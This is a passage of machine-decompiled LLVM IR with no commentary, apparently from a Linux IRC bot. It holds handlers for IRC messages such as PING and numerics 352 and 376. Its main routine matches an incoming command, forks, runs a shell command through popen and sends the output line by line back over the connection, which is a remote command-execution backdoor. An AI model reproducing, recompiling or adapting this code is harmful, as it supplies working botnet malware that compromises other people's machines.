dec_label_pc_804a676.dec_label_pc_804a6a8_crit_edge: ; preds = %dec_label_pc_804a676
  %.pre36 = inttoptr i32 %.pre29 to i8*
  br label %dec_label_pc_804a6a8

dec_label_pc_804a69b:                             ; preds = %dec_label_pc_804a676
  %v11_804a69e = icmp ult i32 %.pre29, %storemerge9
  store i1 %v11_804a69e, i1* %cf.global-to-local, align 1
  %v1_804a6a1 = inttoptr i32 %.pre29 to i8*
  %v2_804a6a1 = load i8, i8* %v1_804a6a1, align 1
  %v3_804a6a4 = icmp ult i8 %v2_804a6a1, 32
  store i1 %v3_804a6a4, i1* %cf.global-to-local, align 1
  %v7_804a6a4 = icmp eq i8 %v2_804a6a1, 32
  %v1_804a6a6 = icmp eq i1 %v7_804a6a4, false
  br i1 %v1_804a6a6, label %dec_label_pc_804a673, label %dec_label_pc_804a6a8

dec_label_pc_804a6a8:                             ; preds = %dec_label_pc_804a69b, %dec_label_pc_804a676.dec_label_pc_804a6a8_crit_edge
  %v1_804a6ae.pre-phi = phi i8* [ %.pre36, %dec_label_pc_804a676.dec_label_pc_804a6a8_crit_edge ], [ %v1_804a6a1, %dec_label_pc_804a69b ]
  %v11_804a6ab = icmp ult i32 %.pre29, %storemerge9
  store i1 %v11_804a6ab, i1* %cf.global-to-local, align 1
  store i8 0, i8* %v1_804a6ae.pre-phi, align 1
  %v0_804a6b1 = load i32, i32* @global_var_80678c4.101, align 4
  %v4_804a6c0 = call i32 @strwildmatch(i8* %v22_804a667, i32 %v0_804a6b1)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804a6c5 = icmp eq i32 %v4_804a6c0, 0
  %v1_804a6c7 = icmp eq i1 %v1_804a6c5, false
  br i1 %v1_804a6c7, label %dec_label_pc_804aa9f, label %dec_label_pc_804a6cd

dec_label_pc_804a6cd:                             ; preds = %dec_label_pc_804a6a8
  store i1 %v11_804a6ab, i1* %cf.global-to-local, align 1
  %v1_804a6d3 = add i32 %.pre29, 1
  %v5_804a6d4 = inttoptr i32 %v1_804a6d3 to i8*
  store i1 false, i1* @df, align 1
  store i32 %v1_804a6d3, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_805b410.102 to i32), i32* @edi, align 4
  %v7_804a707 = call i32 @_strncmp(i8* %v5_804a6d4, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805b410.102, i32 0, i32 0), i32 4)
  %v8_804a707 = urem i32 %v7_804a707, 2
  %v9_804a707 = icmp eq i32 %v8_804a707, 0
  %v0_804a709 = load i1, i1* %cf.global-to-local, align 1
  %v2_804a709 = or i1 %v0_804a709, %v9_804a707
  %v3_804a709 = zext i1 %v2_804a709 to i32
  %v4_804a709 = load i32, i32* @edx, align 4
  %v5_804a709 = and i32 %v4_804a709, -256
  %v6_804a709 = or i32 %v3_804a709, %v5_804a709
  %v7_804a709 = xor i32 %v6_804a709, 1
  store i32 %v7_804a709, i32* @edx, align 4
  %v1_804a711 = trunc i32 %v7_804a709 to i8
  %v3_804a711 = zext i1 %v0_804a709 to i8
  %v15_804a711 = icmp eq i8 %v1_804a711, %v3_804a711
  store i1 false, i1* @cf, align 1
  %v1_804a71a = icmp eq i1 %v15_804a711, false
  br i1 %v1_804a71a, label %dec_label_pc_804a760, label %dec_label_pc_804a71c

dec_label_pc_804a71c:                             ; preds = %dec_label_pc_804a6cd
  %v0_804a71c = load i8, i8* @global_var_8062e24.27, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804a723 = icmp eq i8 %v0_804a71c, 0
  br i1 %v4_804a723, label %dec_label_pc_804a743, label %dec_label_pc_804a727

dec_label_pc_804a727:                             ; preds = %dec_label_pc_804a71c
  %v3_804a73c = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_805a6ef.29 to i32))
  br label %dec_label_pc_804a760

dec_label_pc_804a743:                             ; preds = %dec_label_pc_804a71c
  %v5_804a746 = icmp ugt i8* %v5_804a6d4, inttoptr (i32 -5 to i8*)
  store i1 %v5_804a746, i1* %cf.global-to-local, align 1
  %v3_804a75b = call i32 @Send(i32 %arg1, i32 ptrtoint ([4 x i8]* @global_var_805b415.103 to i32))
  br label %dec_label_pc_804a760

dec_label_pc_804a760:                             ; preds = %dec_label_pc_804a6cd, %dec_label_pc_804a727, %dec_label_pc_804a743
  store i1 false, i1* @df, align 1
  store i32 %v1_804a6d3, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805b419.104 to i32), i32* @edi, align 4
  %v7_804a790 = call i32 @_strncmp(i8* %v5_804a6d4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b419.104, i32 0, i32 0), i32 3)
  %v8_804a790 = urem i32 %v7_804a790, 2
  %v9_804a790 = icmp eq i32 %v8_804a790, 0
  %v0_804a792 = load i1, i1* @cf, align 1
  %v2_804a792 = or i1 %v0_804a792, %v9_804a790
  %v3_804a792 = zext i1 %v2_804a792 to i32
  %v4_804a792 = load i32, i32* @edx, align 4
  %v5_804a792 = and i32 %v4_804a792, -256
  %v6_804a792 = or i32 %v3_804a792, %v5_804a792
  %v7_804a792 = xor i32 %v6_804a792, 1
  store i32 %v7_804a792, i32* %edx.global-to-local, align 4
  %v3_804a798 = and i32 %v7_804a790, -256
  %v1_804a79a = trunc i32 %v7_804a792 to i8
  %v3_804a79a = zext i1 %v0_804a792 to i8
  %v4_804a79a = sub nsw i8 %v1_804a79a, %v3_804a79a
  %v15_804a79a = icmp eq i8 %v4_804a79a, 0
  %v20_804a79a = zext i8 %v4_804a79a to i32
  %v23_804a79a = or i32 %v20_804a79a, %v3_804a798
  store i32 %v23_804a79a, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804a7a3 = icmp eq i1 %v15_804a79a, false
  br i1 %v1_804a7a3, label %dec_label_pc_804a8a6, label %dec_label_pc_804a7a9

dec_label_pc_804a7a9:                             ; preds = %dec_label_pc_804a760
  %v1_804a7af = call i32 @mfork(i32 %v4_804a5df)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804a7b4 = icmp eq i32 %v1_804a7af, 0
  %v1_804a7b6 = icmp eq i1 %v1_804a7b4, false
  br i1 %v1_804a7b6, label %dec_label_pc_804aa9f, label %dec_label_pc_804a7bc

dec_label_pc_804a7bc:                             ; preds = %dec_label_pc_804a7a9
  %v2_804a7cc = ptrtoint i32* %stack_var_-2136 to i32
  %v5_804a7d5 = bitcast i32* %stack_var_-2136 to i8*
  %v6_804a7d5 = call i32 @__GI_memset(i8* %v5_804a7d5, i32 0, i32 1024)
  %v5_804a7dd = icmp ugt i8* %v5_804a6d4, inttoptr (i32 -4 to i8*)
  store i1 %v5_804a7dd, i1* %cf.global-to-local, align 1
  %v3_804a7f5 = call i32 @sprintf(i32 %v2_804a7cc, i32 ptrtoint ([60 x i8]* @global_var_805b420.105 to i32))
  store i32 %v2_804a7cc, i32* @eax, align 4
  %v4_804a80b = call i32 @popen(i32 %v2_804a7cc, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_805a70d.34, i32 0, i32 0))
  %v1_804a886 = inttoptr i32 %v4_804a80b to i16*
  %v2_804a886128 = call i32 @feof(i16* %v1_804a886)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804a88b129 = icmp eq i32 %v2_804a886128, 0
  br i1 %v1_804a88b129, label %dec_label_pc_804a815, label %dec_label_pc_804a88f

dec_label_pc_804a815:                             ; preds = %dec_label_pc_804a7bc, %dec_label_pc_804a815
  %v6_804a82e = call i32 @__GI_memset(i8* %v5_804a7d5, i32 0, i32 1024)
  %v5_804a84b = call i32 @fgets(i32 %v2_804a7cc, i32 1024, i32 %v4_804a80b)
  %v3_804a86f = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_805b45c.106 to i32))
  %v1_804a87b = call i32 @sleep(i32 1)
  %v2_804a886 = call i32 @feof(i16* %v1_804a886)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804a88b = icmp eq i32 %v2_804a886, 0
  br i1 %v1_804a88b, label %dec_label_pc_804a815, label %dec_label_pc_804a88f

dec_label_pc_804a88f:                             ; preds = %dec_label_pc_804a815, %dec_label_pc_804a7bc
  %v1_804a895 = call i32 @pclose(i32 %v4_804a80b)
  %v1_804a8a1 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804a8a6

dec_label_pc_804a8a6:                             ; preds = %dec_label_pc_804a760, %dec_label_pc_804a88f
  %v3_804a8bd = call i32 @_strlen(i8* %v5_804a6d4)
  %v4_804a8bd = mul i32 %v3_804a8bd, -1
  %v1_804a8c3 = sub i32 0, %v4_804a8bd
  %v10_804a8fd112 = icmp ne i32 %v4_804a8bd, 0
  store i1 %v10_804a8fd112, i1* %cf.global-to-local, align 1
  %v5_804a900117 = icmp sgt i32 %v1_804a8c3, 0
  br i1 %v5_804a900117, label %dec_label_pc_804a8d0, label %dec_label_pc_804a91e.preheader

dec_label_pc_804a8d0:                             ; preds = %dec_label_pc_804a8a6, %dec_label_pc_804a8e4
  %v4_804a8d0121 = phi i32 [ %v5_804a8f4, %dec_label_pc_804a8e4 ], [ %v1_804a6d3, %dec_label_pc_804a8a6 ]
  %storemerge8120 = phi i32 [ %v4_804a8f7, %dec_label_pc_804a8e4 ], [ 0, %dec_label_pc_804a8a6 ]
  %stack_var_-32.0119 = phi i8* [ %v22_804a8f4, %dec_label_pc_804a8e4 ], [ %v5_804a6d4, %dec_label_pc_804a8a6 ]
  %v2_804a8d3 = load i8, i8* %stack_var_-32.0119, align 1
  %v3_804a8d6 = icmp ult i8 %v2_804a8d3, 32
  store i1 %v3_804a8d6, i1* %cf.global-to-local, align 1
  %v7_804a8d6 = icmp eq i8 %v2_804a8d3, 32
  br i1 %v7_804a8d6, label %dec_label_pc_804a91e.preheader, label %dec_label_pc_804a8da

dec_label_pc_804a8da:                             ; preds = %dec_label_pc_804a8d0
  %v2_804a8dd = load i8, i8* %stack_var_-32.0119, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804a8e0 = icmp eq i8 %v2_804a8dd, 0
  br i1 %v4_804a8e0, label %dec_label_pc_804a91e.preheader, label %dec_label_pc_804a8e4

dec_label_pc_804a8e4:                             ; preds = %dec_label_pc_804a8da
  store i32 %v4_804a8d0121, i32* %edx.global-to-local, align 4
  %v2_804a8ea = load i8, i8* %stack_var_-32.0119, align 1
  %v3_804a8ea = zext i8 %v2_804a8ea to i32
  store i32 %v3_804a8ea, i32* %edx.global-to-local, align 4
  %v2_804a8ed = load i32, i32* @ebp, align 4
  %v4_804a8ed = add nsw i32 %storemerge8120, -1108
  %v5_804a8ed = add i32 %v4_804a8ed, %v2_804a8ed
  %v6_804a8ed = inttoptr i32 %v5_804a8ed to i8*
  store i8 %v2_804a8ea, i8* %v6_804a8ed, align 1
  %v5_804a8f4 = add i32 %v4_804a8d0121, 1
  %v22_804a8f4 = inttoptr i32 %v5_804a8f4 to i8*
  %v4_804a8f7 = add nuw nsw i32 %storemerge8120, 1
  %v10_804a8fd = icmp ult i32 %v4_804a8f7, %v1_804a8c3
  store i1 %v10_804a8fd, i1* %cf.global-to-local, align 1
  %v5_804a900 = icmp slt i32 %v4_804a8f7, %v1_804a8c3
  br i1 %v5_804a900, label %dec_label_pc_804a8d0, label %dec_label_pc_804a91e.preheader

dec_label_pc_804a91e.preheader:                   ; preds = %dec_label_pc_804a8d0, %dec_label_pc_804a8da, %dec_label_pc_804a8e4, %dec_label_pc_804a8a6
  %stack_var_-32.0.lcssa = phi i8* [ %v5_804a6d4, %dec_label_pc_804a8a6 ], [ %v22_804a8f4, %dec_label_pc_804a8e4 ], [ %stack_var_-32.0119, %dec_label_pc_804a8da ], [ %stack_var_-32.0119, %dec_label_pc_804a8d0 ]
  %v4_804a8d0.lcssa = phi i32 [ %v1_804a6d3, %dec_label_pc_804a8a6 ], [ %v5_804a8f4, %dec_label_pc_804a8e4 ], [ %v4_804a8d0121, %dec_label_pc_804a8da ], [ %v4_804a8d0121, %dec_label_pc_804a8d0 ]
  br label %dec_label_pc_804a91e

dec_label_pc_804a90b:                             ; preds = %dec_label_pc_804a91e
  %v6_804a90e = add i32 %storemerge7, %v4_804a8d0.lcssa
  %v11_804a90e = icmp ult i32 %v6_804a90e, %storemerge7
  store i1 %v11_804a90e, i1* %cf.global-to-local, align 1
  %v1_804a911 = inttoptr i32 %v6_804a90e to i8*
  %v2_804a911 = load i8, i8* %v1_804a911, align 1
  %v3_804a914 = icmp ult i8 %v2_804a911, 32
  store i1 %v3_804a914, i1* %cf.global-to-local, align 1
  %v7_804a914 = icmp eq i8 %v2_804a911, 32
  %v1_804a916 = icmp eq i1 %v7_804a914, false
  br i1 %v1_804a916, label %dec_label_pc_804a91b, label %dec_label_pc_804a918

dec_label_pc_804a918:                             ; preds = %dec_label_pc_804a90b
  %v4_804a918 = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_804a91b

dec_label_pc_804a91b:                             ; preds = %dec_label_pc_804a90b, %dec_label_pc_804a918
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_804a90b ], [ %v4_804a918, %dec_label_pc_804a918 ]
  %v4_804a91b = add i32 %storemerge7, 1
  br label %dec_label_pc_804a91e

dec_label_pc_804a91e:                             ; preds = %dec_label_pc_804a91e.preheader, %dec_label_pc_804a91b
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804a91b ], [ 0, %dec_label_pc_804a91e.preheader ]
  %storemerge7 = phi i32 [ %v4_804a91b, %dec_label_pc_804a91b ], [ 0, %dec_label_pc_804a91e.preheader ]
  store i32 %storemerge7, i32* %edx.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804a8d0.lcssa, i32* @edi, align 4
  %v3_804a938 = call i32 @_strlen(i8* %stack_var_-32.0.lcssa)
  %v7_804a93f = icmp ult i32 %storemerge7, %v3_804a938
  store i1 %v7_804a93f, i1* %cf.global-to-local, align 1
  br i1 %v7_804a93f, label %dec_label_pc_804a90b, label %dec_label_pc_804a943

dec_label_pc_804a943:                             ; preds = %dec_label_pc_804a91e
  %v4_804a943 = add i32 %stack_var_-28.1, 1
  %v9_804a946 = icmp ult i32 %v4_804a943, 10
  store i1 %v9_804a946, i1* %cf.global-to-local, align 1
  %v7_804a94a = icmp sgt i32 %v4_804a943, 10
  %.v4_804a943 = select i1 %v7_804a94a, i32 10, i32 %v4_804a943
  %v0_804a960 = load i32, i32* @ebp, align 4
  %tmp = mul i32 %.v4_804a943, 4
  %v3_804a960 = add i32 %tmp, -80
  %v4_804a960 = add i32 %v3_804a960, %v0_804a960
  %v5_804a960 = inttoptr i32 %v4_804a960 to i32*
  store i32 ptrtoint (i32* @global_var_805b46b.107 to i32), i32* %v5_804a960, align 4
  %v2_804aa0d105 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804aa10107 = icmp eq i8 %v2_804aa0d105, 0
  %v1_804aa12109 = icmp eq i1 %v4_804aa10107, false
  br i1 %v1_804aa12109, label %dec_label_pc_804a974, label %dec_label_pc_804aa18

dec_label_pc_804a974:                             ; preds = %dec_label_pc_804a943, %dec_label_pc_804a9c1
  %v4_804aa0a111.in = phi i8* [ %v26_804aa07.pre-phi, %dec_label_pc_804a9c1 ], [ %stack_var_-32.0.lcssa, %dec_label_pc_804a943 ]
  %stack_var_-24.0110 = phi i32 [ %v4_804aa01, %dec_label_pc_804a9c1 ], [ 1, %dec_label_pc_804a943 ]
  %v4_804aa0a111 = ptrtoint i8* %v4_804aa0a111.in to i32
  %v5_804a974 = add i32 %v4_804aa0a111, 1
  %v22_804a974 = inttoptr i32 %v5_804a974 to i8*
  %v10_804a97a = icmp ult i32 %stack_var_-24.0110, %.v4_804a943
  store i1 %v10_804a97a, i1* %cf.global-to-local, align 1
  %v5_804a97d = icmp slt i32 %stack_var_-24.0110, %.v4_804a943
  br i1 %v5_804a97d, label %dec_label_pc_804a98f.preheader, label %dec_label_pc_804aa18

dec_label_pc_804a98f.preheader:                   ; preds = %dec_label_pc_804a974
  br label %dec_label_pc_804a98f

dec_label_pc_804a98c:                             ; preds = %dec_label_pc_804a9b4
  %v4_804a98c = add i32 %storemerge6, 1
  br label %dec_label_pc_804a98f

dec_label_pc_804a98f:                             ; preds = %dec_label_pc_804a98f.preheader, %dec_label_pc_804a98c
  %storemerge6 = phi i32 [ %v4_804a98c, %dec_label_pc_804a98c ], [ 0, %dec_label_pc_804a98f.preheader ]
  store i32 %storemerge6, i32* %edx.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v5_804a974, i32* @edi, align 4
  %v3_804a9a9 = call i32 @_strlen(i8* %v22_804a974)
  %v4_804a9a9 = mul i32 %v3_804a9a9, -1
  %v5_804a9a9 = add i32 %v4_804a9a9, -2
  store i32 %v5_804a9a9, i32* @ecx, align 4
  %v1_804a9af = sub i32 0, %v4_804a9a9
  %v0_804a9b0 = load i32, i32* %edx.global-to-local, align 4
  %v7_804a9b0 = icmp ult i32 %v0_804a9b0, %v1_804a9af
  store i1 %v7_804a9b0, i1* %cf.global-to-local, align 1
  %v1_804a9b2 = icmp eq i1 %v7_804a9b0, false
  %.pre38 = add i32 %storemerge6, %v5_804a974
  br i1 %v1_804a9b2, label %dec_label_pc_804a98f.dec_label_pc_804a9c1_crit_edge, label %dec_label_pc_804a9b4

dec_label_pc_804a98f.dec_label_pc_804a9c1_crit_edge: ; preds = %dec_label_pc_804a98f
  %.pre45 = inttoptr i32 %.pre38 to i8*
  br label %dec_label_pc_804a9c1

dec_label_pc_804a9b4:                             ; preds = %dec_label_pc_804a98f
  %v11_804a9b7 = icmp ult i32 %.pre38, %storemerge6
  store i1 %v11_804a9b7, i1* %cf.global-to-local, align 1
  %v1_804a9ba = inttoptr i32 %.pre38 to i8*
  %v2_804a9ba = load i8, i8* %v1_804a9ba, align 1
  %v3_804a9bd = icmp ult i8 %v2_804a9ba, 32
  store i1 %v3_804a9bd, i1* %cf.global-to-local, align 1
  %v7_804a9bd = icmp eq i8 %v2_804a9ba, 32
  %v1_804a9bf = icmp eq i1 %v7_804a9bd, false
  br i1 %v1_804a9bf, label %dec_label_pc_804a98c, label %dec_label_pc_804a9c1

dec_label_pc_804a9c1:                             ; preds = %dec_label_pc_804a9b4, %dec_label_pc_804a98f.dec_label_pc_804a9c1_crit_edge
  %v26_804aa07.pre-phi = phi i8* [ %.pre45, %dec_label_pc_804a98f.dec_label_pc_804a9c1_crit_edge ], [ %v1_804a9ba, %dec_label_pc_804a9b4 ]
  store i32 %stack_var_-24.0110, i32* @ebx, align 4
  %v1_804a9c7 = add i32 %storemerge6, 1
  %v1_804a9cb = call i32 @malloc(i32 %v1_804a9c7)
  %v1_804a9d0 = load i32, i32* @ebp, align 4
  %v2_804a9d0 = load i32, i32* @ebx, align 4
  %v3_804a9d0 = mul i32 %v2_804a9d0, 4
  %v4_804a9d0 = add i32 %v1_804a9d0, -84
  %v5_804a9d0 = add i32 %v4_804a9d0, %v3_804a9d0
  %v6_804a9d0 = inttoptr i32 %v5_804a9d0 to i32*
  store i32 %v1_804a9cb, i32* %v6_804a9d0, align 4
  store i32 %storemerge6, i32* %edx.global-to-local, align 4
  %v0_804a9da = load i32, i32* @ebp, align 4
  %v2_804a9da = mul nuw nsw i32 %stack_var_-24.0110, 4
  %v3_804a9da = add nuw nsw i32 %v2_804a9da, -84
  %v4_804a9da = add i32 %v0_804a9da, %v3_804a9da
  %v5_804a9da = inttoptr i32 %v4_804a9da to i32*
  %v6_804a9da = load i32, i32* %v5_804a9da, align 4
  %v5_804a9ec = inttoptr i32 %v6_804a9da to i8*
  %v6_804a9ec = call i32 @strncpy(i8* %v5_804a9ec, i32 %v5_804a974, i32 %storemerge6)
  %v0_804a9f4 = load i32, i32* @ebp, align 4
  %v4_804a9f4 = add i32 %v0_804a9f4, %v3_804a9da
  %v5_804a9f4 = inttoptr i32 %v4_804a9f4 to i32*
  %v6_804a9f4 = load i32, i32* %v5_804a9f4, align 4
  store i32 %v6_804a9f4, i32* %edx.global-to-local, align 4
  %v2_804a9fb = add i32 %v6_804a9f4, %storemerge6
  %v1_804a9fe = inttoptr i32 %v2_804a9fb to i8*
  store i8 0, i8* %v1_804a9fe, align 1
  %v4_804aa01 = add nuw nsw i32 %stack_var_-24.0110, 1
  %v11_804aa07 = icmp ult i32 %.pre38, %v5_804a974
  store i1 %v11_804aa07, i1* %cf.global-to-local, align 1
  %v2_804aa0d = load i8, i8* %v26_804aa07.pre-phi, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804aa10 = icmp eq i8 %v2_804aa0d, 0
  %v1_804aa12 = icmp eq i1 %v4_804aa10, false
  br i1 %v1_804aa12, label %dec_label_pc_804a974, label %dec_label_pc_804aa18

dec_label_pc_804aa18:                             ; preds = %dec_label_pc_804a9c1, %dec_label_pc_804a974, %dec_label_pc_804a943
  %v4_804aa94 = load i32, i32* bitcast ([8 x i8]** @global_var_805e5e0.109 to i32*), align 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804aa9b = icmp eq i32 %v4_804aa94, 0
  %v1_804aa9d = icmp eq i1 %v1_804aa9b, false
  br i1 %v1_804aa9d, label %dec_label_pc_804aa21, label %dec_label_pc_804aa9f

dec_label_pc_804aa21:                             ; preds = %dec_label_pc_804aa18
  store i32 %v4_804aa94, i32* %edx.global-to-local, align 4
  %v3_804aa38 = inttoptr i32 %v4_804aa94 to i8*
  %v4_804aa38 = call i32 @__GI_strcasecmp(i8* %v3_804aa38, i32 %v2_804a641)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804aa44 = load i32, i32* @global_var_805e5e4.110, align 4
  store i32 %v4_804aa44, i32* @ecx, align 4
  %v1_804aa4e = add i32 %.v4_804a943, -1
  store i32 %v1_804aa4e, i32* %edx.global-to-local, align 4
  call void @__pseudo_call(i32 %v4_804aa44)
  %v10_804aa8795 = icmp ugt i32 %.v4_804a943, 1
  store i1 %v10_804aa8795, i1* %cf.global-to-local, align 1
  %v5_804aa8a102 = icmp sgt i32 %.v4_804a943, 1
  br i1 %v5_804aa8a102, label %dec_label_pc_804aa72, label %dec_label_pc_804aa9f

dec_label_pc_804aa72:                             ; preds = %dec_label_pc_804aa21, %dec_label_pc_804aa72
  %storemerge103 = phi i32 [ %v4_804aa81, %dec_label_pc_804aa72 ], [ 1, %dec_label_pc_804aa21 ]
  %v0_804aa75 = load i32, i32* @ebp, align 4
  %v2_804aa75 = mul nuw nsw i32 %storemerge103, 4
  %v3_804aa75 = add nuw nsw i32 %v2_804aa75, -84
  %v4_804aa75 = add i32 %v3_804aa75, %v0_804aa75
  %v5_804aa75 = inttoptr i32 %v4_804aa75 to i32*
  %v6_804aa75 = load i32, i32* %v5_804aa75, align 4
  %v1_804aa7c = call i32 @free(i32 %v6_804aa75)
  %v4_804aa81 = add nuw nsw i32 %storemerge103, 1
  %v10_804aa87 = icmp ult i32 %v4_804aa81, %.v4_804a943
  store i1 %v10_804aa87, i1* %cf.global-to-local, align 1
  %v5_804aa8a = icmp slt i32 %v4_804aa81, %.v4_804a943
  br i1 %v5_804aa8a, label %dec_label_pc_804aa72, label %dec_label_pc_804aa9f

dec_label_pc_804aa9f:                             ; preds = %dec_label_pc_804aa21, %dec_label_pc_804aa72, %dec_label_pc_804aa18, %dec_label_pc_804a7a9, %dec_label_pc_804a6a8, %dec_label_pc_804a625, %dec_label_pc_804a60e
  %v0_804aaa9 = phi i32 [ %v4_804aa94, %dec_label_pc_804aa18 ], [ %v1_804a7af, %dec_label_pc_804a7a9 ], [ %v4_804a6c0, %dec_label_pc_804a6a8 ], [ %v4_804a634, %dec_label_pc_804a625 ], [ %v3_804a61a, %dec_label_pc_804a60e ], [ 1, %dec_label_pc_804aa21 ], [ %.v4_804a943, %dec_label_pc_804aa72 ]
  %v0_804aa9f = load i32, i32* @esp, align 4
  %v5_804aa9f = icmp ugt i32 %v0_804aa9f, -2205
  store i1 %v5_804aa9f, i1* %cf.global-to-local, align 1
  ret i32 %v0_804aaa9

; uselistorder directives
  uselistorder i32 %v4_804aa81, { 2, 1, 0 }
  uselistorder i32 %storemerge103, { 1, 0 }
  uselistorder i32 %v4_804aa94, { 0, 2, 1, 3 }
  uselistorder i8* %v26_804aa07.pre-phi, { 1, 0 }
  uselistorder i32 %.pre38, { 0, 3, 2, 1 }
  uselistorder i32 %storemerge6, { 0, 1, 2, 3, 6, 4, 7, 5 }
  uselistorder i32 %v5_804a974, { 1, 2, 0, 3, 4 }
  uselistorder i32 %stack_var_-24.0110, { 4, 3, 2, 0, 1 }
  uselistorder i32 %.v4_804a943, { 1, 7, 8, 2, 3, 6, 4, 5, 0 }
  uselistorder i32 %storemerge7, { 0, 4, 1, 3, 2 }
  uselistorder i32 %v4_804a8f7, { 2, 1, 0 }
  uselistorder i32 %v5_804a8f4, { 0, 2, 1 }
  uselistorder i8* %stack_var_-32.0119, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v4_804a8d0121, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804a8c3, { 1, 2, 0 }
  uselistorder i16* %v1_804a886, { 1, 0 }
  uselistorder i1 %v0_804a792, { 1, 0 }
  uselistorder i32 %v7_804a790, { 1, 0 }
  uselistorder i1 %v0_804a709, { 1, 0 }
  uselistorder i8* %v5_804a6d4, { 0, 1, 4, 3, 5, 2, 6 }
  uselistorder i32 %.pre29, { 0, 1, 4, 3, 2 }
  uselistorder i32 %storemerge9, { 0, 3, 1, 4, 2 }
  uselistorder i32 %.pre21, { 0, 3, 2, 1 }
  uselistorder i32 %storemerge10, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 %v4_804a5df, { 1, 0, 2 }
  uselistorder i32 %.pre, { 2, 0, 1, 5, 4, 3 }
  uselistorder i32 %storemerge11, { 3, 1, 0, 4, 2 }
  uselistorder i1* %cf.global-to-local, { 4, 5, 0, 6, 7, 13, 8, 9, 10, 11, 12, 1, 14, 17, 15, 16, 20, 18, 19, 2, 21, 3, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i32 (i16*)* @feof, { 1, 0 }
  uselistorder [2 x i8]* @global_var_805a70d.34, { 1, 0 }
  uselistorder i32 (i32)* @mfork, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_8062e24.27, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804aa9f, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804aa72, { 1, 0 }
  uselistorder label %dec_label_pc_804a98f, { 1, 0 }
  uselistorder label %dec_label_pc_804a974, { 1, 0 }
  uselistorder label %dec_label_pc_804a91e, { 1, 0 }
  uselistorder label %dec_label_pc_804a91b, { 1, 0 }
  uselistorder label %dec_label_pc_804a91e.preheader, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804a8d0, { 1, 0 }
  uselistorder label %dec_label_pc_804a8a6, { 1, 0 }
  uselistorder label %dec_label_pc_804a815, { 1, 0 }
  uselistorder label %dec_label_pc_804a760, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804a676, { 1, 0 }
  uselistorder label %dec_label_pc_804a5dc, { 1, 0 }
  uselistorder label %dec_label_pc_804a583, { 1, 0 }
}

define i32 @_376(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804aaaa = load i32, i32* @ebp, align 4
  store i32 %v0_804aaaa, i32* %stack_var_-4, align 4
  %v4_804aaaa = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804aaaa, i32* @ebp, align 4
  %v3_804aac7 = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_805b46d.111 to i32))
  %v3_804aaed = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_805b47a.113 to i32))
  %v3_804ab09 = call i32 @Send(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_805b487.114 to i32))
  ret i32 %v3_804ab09

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @_PING(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804ab10 = load i32, i32* @ebp, align 4
  store i32 %v0_804ab10, i32* %stack_var_-4, align 4
  %v4_804ab10 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804ab10, i32* @ebp, align 4
  %v3_804ab2b = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_805b48f.115 to i32))
  ret i32 %v3_804ab2b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @_352(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i8, align 1
  br label %dec_label_pc_804ab56.preheader

dec_label_pc_804ab50:                             ; preds = %dec_label_pc_804ab75
  %v5_804ab50 = add i32 %.pre35, 1
  %v22_804ab50 = inttoptr i32 %v5_804ab50 to i8*
  %v4_804ab53 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_804ab56

dec_label_pc_804ab56:                             ; preds = %dec_label_pc_804ab56.preheader, %dec_label_pc_804ab50
  %stack_var_-28.0 = phi i32 [ %v4_804ab53, %dec_label_pc_804ab50 ], [ %stack_var_-28.171, %dec_label_pc_804ab56.preheader ]
